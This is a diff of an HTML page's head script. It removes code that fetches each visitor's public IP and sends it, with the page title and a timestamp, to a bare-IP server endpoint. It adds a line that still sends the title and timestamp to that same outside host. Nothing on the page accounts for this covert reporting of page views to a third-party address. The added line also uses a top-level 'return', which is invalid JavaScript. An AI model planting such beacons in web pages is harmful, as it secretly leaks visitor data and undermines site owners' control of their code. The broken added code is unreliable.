@@ -60,15 +60,7 @@
   <script>
     const title = document.title;
     const dateTime = new Date().toISOString();
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-        return fetch(`http://165.232.86.153/tg.php?msg=DateTime:${dateTime},Title:${title},IP:${ip}`);
-      })
-      .then(response => response.text())
-      .then(console.log)
-      .catch(console.error);
+    return fetch(`http://165.232.86.153/tg.php?msg=DateTime:${dateTime}  ${title}`);
   </script>
 
 </head>
